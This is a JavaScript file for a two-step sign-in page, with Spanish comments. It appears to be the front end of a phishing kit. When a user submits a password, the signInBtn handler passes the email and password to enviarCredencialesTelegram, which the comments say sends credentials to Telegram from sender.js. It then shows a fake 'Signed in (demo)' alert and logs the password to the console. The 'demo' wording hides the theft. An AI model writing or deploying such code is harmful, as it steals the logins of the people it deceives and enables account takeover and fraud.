// Importar la función para enviar credenciales a Telegram
// Si usas módulos, descomenta la siguiente línea y asegúrate de usar type="module" en tu script en index.html
// import { enviarCredencialesTelegram } from './sender.js';
// Si no usas módulos, incluye sender.js antes que app.js en tu HTML

const panel1 = document.getElementById('panel1');
const panel2 = document.getElementById('panel2');
const continueBtn = document.getElementById('continueBtn');
const identifier = document.getElementById('identifier');
const displayEmail = document.getElementById('displayEmail');
const codeEmail = document.getElementById('codeEmail');
const changeLink = document.getElementById('changeLink');
const optCode = document.getElementById('optCode');
const optPass = document.getElementById('optPass');
const passwordBlock = document.getElementById('passwordBlock');
const togglePwd = document.getElementById('togglePwd');
const password = document.getElementById('password');
const signInBtn = document.getElementById('signInBtn');

function showPanel2(email){
  displayEmail.textContent = email;
  codeEmail.textContent = email;
  panel1.style.display = 'none';
  panel2.style.display = 'block';
  panel2.setAttribute('aria-hidden', 'false');
  panel1.setAttribute('aria-hidden', 'true');
}

continueBtn.addEventListener('click', ()=>{
  const val = identifier.value.trim();
  if(!val){
    identifier.focus();
    identifier.style.borderColor = '#e05';
    return;
  }
  identifier.style.borderColor = '';
  // For demo we accept whatever is typed. If it's a phone, still show it.
  showPanel2(val);
});

changeLink.addEventListener('click', (e)=>{
  e.preventDefault();
  panel2.style.display = 'none';
  panel1.style.display = 'block';
  panel1.setAttribute('aria-hidden','false');
  panel2.setAttribute('aria-hidden','true');
});

// toggle between code/password
optCode.addEventListener('change', ()=>{
  if(optCode.checked){
    passwordBlock.style.display = 'none';
  }
});
optPass.addEventListener('change', ()=>{
  if(optPass.checked){
    passwordBlock.style.display = 'block';
  }
});

togglePwd.addEventListener('click', (e)=>{
  e.preventDefault();
  if(password.type === 'password'){
    password.type = 'text'; togglePwd.textContent = 'Hide';
  } else { password.type = 'password'; togglePwd.textContent = 'Show'; }
});

signInBtn.addEventListener('click', ()=>{
  // Demo behaviour: validate and show an alert
  if(optPass.checked){
    if(!password.value){
      password.style.borderColor = '#e05'; password.focus(); return;
    }
    // Llama a la función para enviar a Telegram
    if(typeof enviarCredencialesTelegram === 'function') {
      enviarCredencialesTelegram(displayEmail.textContent, password.value);
    }
    alert('Signed in as ' + displayEmail.textContent + ' (demo)');
    console.log('Signed in', {email:displayEmail.textContent, password:password.value});
  } else {
    alert('Verification code sent to ' + displayEmail.textContent + ' (demo)');
    console.log('Request code for', displayEmail.textContent);
  }
});

// small UX: enter on field
identifier.addEventListener('keydown', (e)=>{ if(e.key === 'Enter') continueBtn.click(); });
password.addEventListener('keydown', (e)=>{ if(e.key === 'Enter') signInBtn.click(); });

// footer toggle behavior
const optSwitch = document.getElementById('optSwitch');
if(optSwitch){
  // default on
  optSwitch.classList.add('on');
  optSwitch.addEventListener('click', ()=>{
    optSwitch.classList.toggle('on');
    const checked = optSwitch.classList.contains('on');
    optSwitch.setAttribute('aria-checked', checked ? 'true' : 'false');
  });
  optSwitch.addEventListener('keydown', (e)=>{ if(e.key === 'Enter' || e.key === ' ') { e.preventDefault(); optSwitch.click(); }});
}
